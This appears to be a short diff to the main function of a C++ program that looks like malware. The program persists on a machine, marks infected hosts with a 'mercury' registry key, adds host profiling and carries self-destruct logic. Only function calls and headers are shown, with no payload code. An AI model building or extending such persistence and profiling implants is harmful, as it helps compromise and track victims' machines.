@@ -2,6 +2,7 @@
 #include "Core/self_destruct.hpp"
 #include "Core/mark_machine.hpp"
 #include "Core/persistence.hpp"
+#include "Core/profiler.hpp"
 
 
 
@@ -40,8 +41,9 @@ void CleanupAndDestruct() {
 
 
 int main() {
-    MarkMachine();
+    AddRegKey(L"mercury", L"true");
     PersistOnMachine();
+    Profiler();
     CURRENTRUNS = LoadRunCount();
 
     if (ONETIMERUN) {
